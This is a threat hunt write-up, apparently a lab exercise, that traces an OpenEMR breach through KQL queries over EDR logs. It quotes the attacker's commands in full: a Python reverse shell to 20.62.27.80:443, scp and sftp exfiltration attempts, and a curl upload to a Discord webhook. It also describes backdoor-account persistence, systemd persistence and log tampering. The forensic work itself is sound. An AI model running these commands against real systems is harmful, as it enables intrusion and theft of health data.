# 🕵️ Threat Hunt Report: **Rocky Clinic, OpenEMR Breach**

**Analyst:** GABRIEL MARTINI

**Date Completed:** 2026-06-16

**Environment Investigated:** rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net

**Platform:** Docker on RockyLinux (Azure cloud-hosted)

**Investigation Window:** 4 February 2026 – 14 February 2026 UTC

---

## 🧠 Scenario Overview

Rocky Clinic runs OpenEMR, a cloud-hosted electronic health record platform. Earlier this month, they identified a security incident with an unknown initial access path. The intrusion ran across February 2026 — no ransomware, no alerts, no outage. It began quietly. Early activity looked like ordinary administration, but the pattern was deliberate enumeration of identities, data, and workflows, before a pivot to the underlying host. The attacker progressed from quiet exploration to full operational compromise, ultimately exfiltrating patient health record data via a third-party SaaS platform after earlier transfer methods were blocked.

---

## 🎯 Executive Summary

The investigation revealed a stealthy, multi-stage intrusion into Rocky Clinic's Azure-hosted OpenEMR environment. The attacker gained initial access under the `it.admin` account and performed systematic host and environment enumeration, including fingerprinting the OS, reading release files, and checking active sessions. After confirming the Docker-based deployment model, they escalated to root via `sudo -i` and interrogated the MariaDB container and Docker volume structure to map where patient data physically resided. The attacker then identified a trusted backup script for staging, created a backdoor account using `vipw` to avoid detection, and installed a systemd service for persistent execution. A Python reverse shell established outbound C2 to `20.62.27.80:443`. Data was staged as a `.tar.gz` archive, with direct SCP/SFTP transfer attempts failing due to network controls. The attacker ultimately pivoted to Discord's webhook API to successfully exfiltrate the archive. Post-exfiltration, the attacker ran 12 selective `sed -i` deletions across `/var/log/secure` and `/var/log/messages` and timestomped the log file to blur causality.

---

## ✅ Findings Summary

| # | Category | Finding | Answer |
|---|----------|---------|--------|
| 1 | Asset Identification | Fully qualified device name hosting OpenEMR | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| 2 | Hosting Model | Container runtime running OpenEMR | `Docker` |
| 3 | Discovery | PID of first interactive enumeration command (who) | `7214` |
| 4 | Session Boundary | SHA256 of binary behind last operator command before session cleanup | `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` |
| 5 | Account Attribution | Account behind suspicious remote sessions | `it.admin` |
| 6 | Discovery | Number of distinct /etc release files read in one fingerprinting action | `4` |
| 7 | Platform | OS distribution as recorded by EDR | `RockyLinux` |
| 8 | Privilege Escalation | Command used to cross into fully privileged shell | `sudo -i` |
| 9 | Runtime Interrogation | Command that interrogated the database container post-escalation | `docker inspect openemr-mariadb` |
| 10 | Credential Access | Full command that read the privileged automation config artifact | `sed -n 1,200p /etc/openemr/audit_export.env` |
| 11 | Discovery | Command that recursively enumerated Docker volume storage | `find /var/lib/docker/volumes -maxdepth 3 -type f` |
| 12 | Data Mapping | Host filesystem path of persistent database storage | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` |
| 13 | Staging | Trusted operational script targeted for staging leverage | `/opt/backup/scripts/backup_manifest.sh` |
| 14 | Staging | Directory used for staging prep | `/var/lib/integrations/` |
| 15 | Persistence | Unauthorised account created for identity-based persistence | `system` |
| 16 | Persistence | SHA256 of binary used to create the backdoor identity | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` |
| 17 | Persistence | Filename of the secondary non-interactive persistence artifact | `integration-monitor.service` |
| 18 | Persistence | Binary used to create the service file (no editor) | `cat` |
| 19 | C2 | SHA256 of the service file version used to launch C2 | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` |
| 20 | C2 | Full command line that initiated the outbound reverse shell | `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| 21 | C2 | PID of the interactive session spawned by the reverse shell | `8000` |
| 22 | Exfiltration | Filename of the staged archive prepared for transfer | `integration_state_2026-02-10_22-00-01.tar.gz` |
| 23 | Exfiltration | Initiating process command line of the first (failed) transfer attempt | `/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp` |
| 24 | Exfiltration | Command line of the successful exfiltration pivot (Discord webhook) | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/he162lRQsMJ3kKOVBNeiHYutbubwZ0sC-vq7A_phLZx-q4VOS88q4xDOvhxrBqy6nu9K` |
| 25 | Exfiltration | IP address and port of the successful exfiltration endpoint | `162.159.135.232:443` |
| 26 | Defense Evasion | Number of distinct sed -i delete operations across both log files | `12` |
| 27 | Defense Evasion | Binary used to manipulate log files | `sed` |
| 28 | Defense Evasion | Forged timestamp applied to /var/log/messages | `2026-02-06 12:00:00` |
| 29 | Defense Evasion | Technique classification assigned by EDR alert | `["Indicator Removal (T1070)","Timestomp (T1070.006)"]` |

---

## Finding by Finding

---

### 🖥️ 1. Asset Identification

**Objective:** Confirm the fully qualified device name of the system hosting the OpenEMR environment.

**What to Hunt:** File events referencing OpenEMR paths will anchor the investigation to the specific host in the Azure environment.

**Identified Activity:**

```
TimeGenerated [UTC]: (multiple events across window)
FolderPath:          Contains "OpenEMR"
DeviceName:          rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net
```

**Answer:** `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`

**Why It Matters:** Anchoring to the FQDN is the foundation of the entire investigation. All subsequent queries are scoped to this device, ensuring findings are not contaminated by activity from other hosts in the Azure tenant.

**KQL Query Used:**

```kql
DeviceFileEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where FolderPath contains "OpenEMR"
| sort by TimeGenerated
```

---

### 🐳 2. Hosting Model Confirmation

**Objective:** Identify the container runtime hosting the OpenEMR application on rocky83.

**What to Hunt:** Process events containing both "OpenEMR" and "maria" in the command line reveal the execution layer wrapping the application stack.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-13T21:00:01.934876Z
ProcessCommandLine:     docker exec -i -e MYSQL_PWD=... openemr-mariadb mariadb ...
```

**Answer:** `Docker`

**Why It Matters:** Knowing the application runs inside Docker containers is critical for understanding the attack surface. The attacker must interact with the Docker runtime to access the underlying database and data volumes — this shapes how they enumerate, pivot, and stage data throughout the intrusion.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where ProcessCommandLine contains "OpenEMR" and ProcessCommandLine contains "maria"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated
```

---

### 👁️ 3. First Behavioural Tell

**Objective:** Identify the earliest interactive enumeration action in the first suspicious session — the one checking who else is logged in — and provide its PID.

**What to Hunt:** `who` invocations by the `it.admin` account on rocky83 represent operator-driven session awareness checks, distinct from system or maintenance processes.

**Identified Activity:**

```
TimeGenerated [UTC]:    (earliest who invocation by it.admin)
ProcessCommandLine:     who
ProcessId:              7214
```

**Answer:** `7214`

**Why It Matters:** The `who` command is a classic operator tell: the attacker is checking for other active sessions to avoid detection and understand the shared access environment. This is the first behavioural indicator distinguishing deliberate operator action from routine automation, marking the start of the interactive intrusion session.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where AccountDomain == "rocky83" and AccountName == "it.admin"
| where ProcessCommandLine has "who"
| project TimeGenerated, ProcessCommandLine, ProcessId
| sort by TimeGenerated asc
```

---

### 🔏 4. Session Boundary Fingerprint

**Objective:** Identify the SHA256 of the binary behind the last interactive operator command before session cleanup in the same session as Finding 3.

**What to Hunt:** Docker-related commands by `it.admin` on rocky83 — the last one before disconnect confirms what the operator verified before leaving.

**Identified Activity:**

```
TimeGenerated [UTC]:    (last docker command before session end)
SHA256:                 a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d
```

**Answer:** `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d`

**Why It Matters:** The session boundary fingerprint establishes the full temporal scope of the first suspicious session. The final command hash allows defenders to confirm the exact binary version in use and correlate it with threat intelligence feeds for attribution or malware family identification.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where AccountDomain == "rocky83" and AccountName == "it.admin" and FileName == "docker"
| where ProcessCommandLine has_any ("docker", "compose", "exec", "mysql", "mariadb", "sql")
| where not(ProcessCommandLine has_any ("clear", "logout", "exit", "systemd", "cleanup", "history -c"))
| project TimeGenerated, ProcessCommandLine, ProcessId, SHA256
| sort by TimeGenerated asc
```

---

### 👤 5. Account Name Attribution

**Objective:** Identify the account name behind the suspicious remote sessions.

**What to Hunt:** Remote logon events from public IPs, excluding known trusted IP addresses and system/service accounts, reveal the account the attacker used for access.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-11T04:46:37.612917Z
AccountName:            it.admin
RemoteIP:               146.70.202.116
ActionType:             LogonFailed
```

**Answer:** `it.admin`

**Why It Matters:** The `it.admin` account is the pivot point for the entire intrusion. It has sufficient privileges to enumerate the system and escalate to root. Identifying it early allows defenders to scope all suspicious activity correctly and determine whether the account was compromised via credential theft, password spray, or insider threat.

**KQL Query Used:**

```kql
DeviceLogonEvents
| where TimeGenerated between (todatetime('2026-02-07T00:00:00Z') .. todatetime('2026-02-13T23:59:59Z'))
| where RemoteIPType == "Public" and not(RemoteIP in ("68.53.47.150","129.212.183.80","129.212.187.232","167.172.36.176"))
| where isnotempty(RemoteIP) and AccountDomain == "rocky83" and not(AccountName in ("root","nginx","daemon","ftp"))
| project TimeGenerated, AccountName, RemoteIP, ActionType
| sort by TimeGenerated asc
```

---

### 🔍 6. Environment Confirmation

**Objective:** Determine how many distinct `/etc` release files were read in a single fingerprinting action in the first session.

**What to Hunt:** `cat` commands targeting multiple `/etc/*release` files in one invocation reveal the attacker's OS fingerprinting approach.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-08T16:42:50.687825Z
ProcessCommandLine:     cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release
```

**Answer:** `4`

**Why It Matters:** Reading four release files in a single command is deliberate host fingerprinting. The attacker is confirming the exact OS distribution, version, and variant to tailor subsequent exploitation or tool selection. The specific inclusion of `/etc/rocky-release` confirms they expected or suspected a Rocky Linux environment.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName == "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine has "release" and ProcessCommandLine has_any ("cat", "less", "head", "tail")
| project TimeGenerated, ProcessCommandLine
```

---

### 🐧 7. Platform Reality Check

**Objective:** Confirm the OS distribution hosting the platform as recorded by the EDR.

**What to Hunt:** DeviceInfo records for the host provide the authoritative OS distribution string as seen by the telemetry agent.

**Identified Activity:**

```
OSDistribution: RockyLinux
```

**Answer:** `RockyLinux`

**Why It Matters:** Confirming the OS distribution validates the attacker's fingerprinting (Finding 6) and ensures analysts use the correct exploitation assumptions. Rocky Linux is an RHEL-compatible distribution, meaning standard RHEL/CentOS tooling and privilege escalation paths apply throughout the investigation.

**KQL Query Used:**

```kql
DeviceInfo
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName contains "rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| distinct OSDistribution
```

---

### ⬆️ 8. Crossing the Trust Line

**Objective:** Identify the command that moved the attacker from constrained admin into a fully privileged interactive shell.

**What to Hunt:** `sudo` or `su` commands by `it.admin` on rocky83 mark the privilege escalation boundary.

**Identified Activity:**

```
ProcessCommandLine: sudo -i
```

**Answer:** `sudo -i`

**Why It Matters:** `sudo -i` launches an interactive root shell with a full root environment, giving the attacker unrestricted access to the host. This is the trust line crossing — every subsequent action occurs at the highest privilege level, including Docker inspection, file reads, and persistence mechanisms.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName == "rocky83" and AccountName == "it.admin"
| where ProcessCommandLine has_any ("sudo", "su ")
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 🐳 9. Runtime Layer Interrogation

**Objective:** Identify the command that interrogated the database container immediately after privilege escalation.

**What to Hunt:** Docker `inspect` commands targeting the MariaDB container, run under root context, reveal the attacker's intent to map container configuration before touching data.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-09T17:03:14.12467Z
AccountName:            root
ProcessCommandLine:     docker inspect openemr-mariadb
```

**Answer:** `docker inspect openemr-mariadb`

**Why It Matters:** `docker inspect` returns detailed container metadata including mount points, environment variables (including database credentials), network configuration, and restart policies. This single command gave the attacker a complete map of the MariaDB container's configuration — the gateway to all patient health record data.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-07T12:24:43Z') .. todatetime('2026-02-10T23:59:59Z'))
| where DeviceName == "rocky83" and isnotempty(ProcessCommandLine)
| where ProcessCommandLine contains "inspect" and ProcessCommandLine contains "maria"
| project TimeGenerated, AccountName, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 📄 10. The Single File That Explains Everything

**Objective:** Identify the full command that read the privileged automation configuration artifact — the stable file unlocking repeatable access.

**What to Hunt:** `sed` reads of files under `/etc` referencing OpenEMR reveal targeted reads of configuration and secrets files.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-09T15:52:45.385957Z
AccountName:            it.admin
ProcessCommandLine:     sed -n 1,200p /etc/openemr/audit_export.env
```

**Answer:** `sed -n 1,200p /etc/openemr/audit_export.env`

**Why It Matters:** Environment files (`.env`) store plaintext credentials and configuration parameters that persist across reboots and container restarts. `/etc/openemr/audit_export.env` likely contained database credentials, API keys, or export automation secrets. Reading this file gave the attacker durable, credential-level access that would survive system restarts, container rebuilds, and password rotations unless the file itself is updated.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-07T00:00:00Z') .. todatetime('2026-02-10T23:59:59Z'))
| where ProcessCommandLine contains "/etc" and ProcessCommandLine has "sed" and ProcessCommandLine has "openemr"
| project TimeGenerated, AccountName, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 📂 11. Physical Mapping Confirmation

**Objective:** Identify the action that recursively enumerated files inside Docker volume storage.

**What to Hunt:** `find` commands targeting `/var/lib/docker/volumes` by the root account reveal the attacker mapping where container data physically lives on the host filesystem.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-09T17:03:14.167714Z
ProcessCommandLine:     find /var/lib/docker/volumes -maxdepth 3 -type f
```

**Answer:** `find /var/lib/docker/volumes -maxdepth 3 -type f`

**Why It Matters:** Docker volumes persist data outside container lifecycles. By enumerating the volume directory tree, the attacker confirmed where the database files and OpenEMR site data physically reside on disk — bypassing the Docker abstraction layer entirely. This enables direct filesystem access to patient data without needing to interact with the running database service.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where AccountDomain == "rocky83" and AccountName == "root"
| where ProcessCommandLine startswith "find" and ProcessCommandLine !contains "r0ckyyy335"
| where ProcessCommandLine has "docker" and ProcessCommandLine has "volumes"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 🗄️ 12. Where the Data Actually Lives

**Objective:** Identify the host filesystem path the attacker confirmed as persistent database storage.

**What to Hunt:** `ls` commands referencing `mariadb_data` reveal the specific Docker named volume containing the OpenEMR database files.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-09T17:03:14.161384Z
ProcessCommandLine:     ls --color=auto -l /var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data ...
```

**Answer:** `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`

**Why It Matters:** This path is the physical location of all OpenEMR patient health records on the host filesystem. With root access and knowledge of this path, the attacker can directly copy, archive, or exfiltrate the raw MariaDB data files without ever querying the database through the application layer — bypassing all application-level access controls and audit logging.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName == "rocky83"
| where ProcessCommandLine has "mariadb_data"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 📋 13. Hijacking a Trusted Repeating Path

**Objective:** Identify the trusted operational script the attacker tried to leverage for staging.

**What to Hunt:** Reads of scripts under `/opt` referencing "manifest" reveal the attacker targeting existing automation rather than creating new infrastructure.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-09T15:45:07.410438Z
ProcessCommandLine:     sudo cat /opt/backup/scripts/backup_manifest.sh
```

**Answer:** `/opt/backup/scripts/backup_manifest.sh`

**Why It Matters:** Existing backup scripts run automatically on schedules, under trusted service accounts, without interactive logons. By targeting `backup_manifest.sh`, the attacker planned to piggyback on legitimate automation to move data without triggering anomalous process trees. This is a Living Off the Land technique at the operational workflow level — using the environment's own trusted infrastructure as a staging vehicle.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-07T00:00:00Z') .. todatetime('2026-02-10T23:59:59Z'))
| where DeviceName == "rocky83" and AccountName == "it.admin"
| where ProcessCommandLine has "/opt" and ProcessCommandLine contains "manifest"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 📁 14. Staging Where Nobody Looks First

**Objective:** Identify the directory the attacker used for staging prep after the trust-abuse path became inconvenient.

**What to Hunt:** Archive creation commands (`tar`, `gzip`, etc.) on rocky83 reveal where data was staged before transfer.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-10T22:00:00.829974Z
ProcessCommandLine:     tar -czf /var/lib/integrations/integration_state_2026-02-10_22-00-01.tar.gz
                        -C /var/log/openemr/doc_exports/ .
```

**Answer:** `/var/lib/integrations/`

**Why It Matters:** `/var/lib/integrations/` presents as an operational integration state directory — the kind of path a legitimate enterprise system might use for ETL or API synchronisation artifacts. It avoids the immediate suspicion that `/tmp` or `/dev/shm` would attract. Staging data here blends into the operational noise of a healthcare IT environment, reducing the likelihood of discovery during a cursory review.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-07T00:00:00Z') .. todatetime('2026-02-10T23:59:59Z'))
| where DeviceName contains "rocky83"
| where ProcessCommandLine has_any ("tar", "zip", "gzip", "7z", "rar")
| where ProcessCommandLine has_any ("-c", "-cf", "-a", "create", "archive")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| sort by TimeGenerated desc
```

---

### 👻 15. Quiet Persistence Obfuscation

**Objective:** Identify the unauthorised account created for identity-based persistence.

**What to Hunt:** Successful logon events on rocky83 summarised by account name reveal anomalous accounts blending into normal system activity.

**Identified Activity:**

```
AccountName:    system
count_:         1092
```

**Answer:** `system`

**Why It Matters:** An account named `system` is designed to disappear into the background of Linux system account lists. Defenders performing quick account audits may overlook it as a standard system process account. With 1,092 logon events, this account has been actively used — not just created — making it an established persistence mechanism that would survive beacon removal.

**KQL Query Used:**

```kql
DeviceLogonEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where ActionType == "LogonSuccess"
| where AccountDomain == "rocky83"
| summarize count() by AccountName
| sort by count_ desc
```

---

### 🔑 16. Identity Creation Without the Obvious Footprints

**Objective:** Identify the SHA256 of the binary used to create the backdoor account, avoiding standard account-management tools.

**What to Hunt:** `vipw` or `vigr` invocations reveal direct `/etc/passwd` and `/etc/shadow` editing — bypassing `useradd`/`adduser` which would generate more obvious telemetry.

**Identified Activity:**

```
DeviceName:         rocky83
FolderPath:         /usr/sbin/vipw
ProcessCommandLine: vipw -s
SHA256:             dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0
```

**Answer:** `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0`

**Why It Matters:** `vipw -s` edits `/etc/shadow` directly — the file storing hashed user passwords. Using `vipw` instead of `useradd` avoids generating PAM events, system journal entries, and other telemetry that standard account creation tools produce. This is a deliberate evasion choice, the attacker understood what monitoring was in place and chose the path least likely to trigger alerts.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where FileName in~ ("vipw", "vigr")
| distinct DeviceName, FolderPath, ProcessCommandLine, SHA256
```

---

### ⚙️ 17. Secondary Non-Interactive Persistence

**Objective:** Identify the filename of the lightweight host-level execution artifact the attacker installed for reliable non-interactive persistence.

**What to Hunt:** Process commands setting permissions on files under `/etc/systemd/system/` reveal systemd service unit creation.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-10T17:07:22.40891Z
ProcessCommandLine:     chmod 644 /etc/systemd/system/integration-monitor.service
```

**Answer:** `integration-monitor.service`

**Why It Matters:** A systemd service fires at boot and on failure, without requiring any user interaction or logon. The name `integration-monitor` is designed to blend in with legitimate healthcare IT integration tooling. This service provides execution persistence that survives reboots, account lockouts, and even removal of the `system` backdoor account — it is the most durable persistence mechanism deployed in this intrusion.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where ProcessCommandLine contains "/etc/systemd/system/" and ProcessCommandLine has "."
| where AccountDomain == "rocky83"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

---

### 🐱 18. No Editor File Creation

**Objective:** Identify the binary used to create the persistent service file, avoiding editor telemetry.

**What to Hunt:** File creation events for `integration-monitor.service` reveal the initiating process, distinguishing editor-based creation from piped redirection.

**Identified Activity:**

```
TimeGenerated [UTC]:            2026-02-10T17:07:16.561766Z
DeviceName:                     rocky83
ActionType:                     FileCreated
FileName:                       integration-monitor.service
InitiatingProcessFileName:      cat
```

**Answer:** `cat`

**Why It Matters:** Using `cat` with shell redirection (e.g., `cat > file << 'EOF'`) creates files without spawning an editor process like `vim`, `nano`, or `vi`. Editors generate additional telemetry including file open/save events and swap files. The use of `cat` is a low-footprint file creation technique that reduces the forensic evidence left behind.

**KQL Query Used:**

```kql
DeviceFileEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where FileName == "integration-monitor.service"
| project TimeGenerated, DeviceName, ActionType, FileName, InitiatingProcessFileName
| sort by TimeGenerated asc
```

---

### 🔒 19. Pre-Activation Integrity Check

**Objective:** Identify the SHA256 of the service file version used to launch the C2 connection — the arm-the-trap moment.

**What to Hunt:** File events for `integration-monitor.service` in the pre-C2 window, showing the final edit before `systemctl enable/start`.

**Identified Activity:**

```
TimeGenerated [UTC]:                2026-02-11T04:16:01.991344Z
ActionType:                         FileCreated
SHA256:                             f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8
InitiatingProcessCommandLine:       /usr/bin/vim /etc/systemd/system/integration-monitor.service
```

**Answer:** `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8`

**Why It Matters:** The service file was edited with `vim` immediately before C2 activation, confirming the attacker made last-minute configuration changes — likely inserting the specific reverse shell payload. The SHA256 of this version is the definitive artefact hash that ties the persistence mechanism to the outbound connection: the same file that launched the C2 session. This hash enables detection rule creation for future incidents.

**KQL Query Used:**

```kql
DeviceFileEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where DeviceName contains "rocky83"
| where FileName =~ "integration-monitor.service"
| project TimeGenerated, ActionType, SHA256, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### 📡 20. Outbound Control Command

**Objective:** Identify the complete process command line that initiated the interactive outbound C2 connection.

**What to Hunt:** Process events containing socket and subprocess patterns characteristic of Python reverse shells.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-13T20:09:51.248403Z
FileName:               python3.9
ProcessCommandLine:     /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();
                        s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);
                        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
                        subprocess.call(["/bin/sh","-i"])'
```

**Answer:** `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`

**Why It Matters:** This Python one-liner is a textbook reverse shell: it connects outbound to the attacker's server on port 443 (HTTPS, typically allowed through firewalls), then redirects stdin, stdout, and stderr through the socket, giving the attacker an interactive shell on the OpenEMR host. The C2 IP `20.62.27.80` is the attacker-controlled server and a key indicator for network blocking and threat intelligence reporting.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-04T00:00:00Z') .. todatetime('2026-02-14T23:59:59Z'))
| where AccountDomain == "rocky83"
| where ProcessCommandLine has_all ("socket", "subprocess", "os.dup2")
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### 🐚 21. Reverse Shell Process Identification

**Objective:** Identify the PID of the interactive shell session spawned by the reverse shell — not the reverse shell process itself.

**What to Hunt:** Process events in the narrow window after C2 activation, filtering for `it.admin` on rocky83, reveal the interactive `/bin/sh -i` child process.

**Identified Activity:**

```
TimeGenerated [UTC]:            2026-02-11T04:18:21.579967Z
ProcessId:                      8000
FileName:                       bash
ProcessCommandLine:             /bin/sh -i
InitiatingProcessId:            8000
```

**Answer:** `8000`

**Why It Matters:** The interactive shell PID is the active attacker session on the host. All subsequent commands — including the exfiltration and cleanup actions — originate from processes descended from PID 8000. This PID is the forensic anchor for the attacker's post-C2 activity and allows defenders to reconstruct the full process tree of the intrusion's final phase.

**KQL Query Used:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2026-02-11T04:16:21.185Z') .. todatetime('2026-02-11T04:21:00Z'))
| where DeviceName contains "rocky83" and AccountName == "it.admin"
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine, InitiatingProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### 📦 22. Staged Archive Identification

**Objective:** Identify the filename of the archive the attacker prepared for transfer.

**What to Hunt:** The SCP command from the post-C2 session reveals the staged archive filename used for exfiltration.

**Identified Activity:**

```
TimeGenerated [UTC]:    2026-02-11T04:20:28.464075Z
ProcessCommandLine:     scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/
```

**Answer:** `integration_state_2026-02-10_22-00-01.tar.gz`

**Why It Matters:** The archive filename mimics a legitimate integration state export — consistent with the staging directory choice (`/var/lib/integrations/`). The embedded timestamp `2026-02-10_22-00-01` confirms the data was staged the night before the C2 session, indicating the attacker prepared the exfiltration package in advance. The destination user `streetrack` on `20.62.27.80` is an attacker-controlled account and a key attribution artefact.

---

### ❌ 23. First Exfiltration Attempt

**Objective:** Identify the initiating process command line tied to the failed first transfer attempt.

**What to Hunt:** Failed network connection events on rocky83 after C2 activation reveal the blocked transfer method.

**Identified Activity:**

```
TimeGenerated [UTC]:            2026-02-11T04:22:39.237322Z
InitiatingProcessCommandLine:   /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes
                                -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no
                                -l streetrack -s -- 20.62.27.80 sftp
```

**Answer:** `/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp`

**Why It Matters:** The failed SFTP attempt reveals that direct SSH-based file transfers were blocked by network controls — either egress firewall rules or egress filtering preventing non-HTTP/HTTPS outbound connections. This forced the attacker to identify an alternative transfer path, demonstrating operational adaptability. The blocked attempt is also critical for defenders: it confirms that existing network controls partially functioned and should be investigated to understand what specifically blocked the SFTP session.

**KQL Query Used:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (todatetime('2026-02-11T04:16:21.185Z') .. todatetime('2026-02-12T04:21:00Z'))
| where DeviceName contains "rocky83" and ActionType == "ConnectionFailed"
| project TimeGenerated, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### ✅ 24. Successful Exfiltration Pivot

**Objective:** Identify the command line that successfully transferred data out after earlier attempts failed.

**What to Hunt:** Non-failed outbound curl connections from rocky83 in the exfiltration window reveal the successful transfer method.

**Identified Activity:**

```
TimeGenerated [UTC]:            2026-02-13T20:10:51.331348Z
ActionType:                     ConnectionRequest
InitiatingProcessCommandLine:   curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz
                                https://discord.com/api/webhooks/1471960320636620832/...
```

**Answer:** `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/he162lRQsMJ3kKOVBNeiHYutbubwZ0sC-vq7A_phLZx-q4VOS88q4xDOvhxrBqy6nu9K`

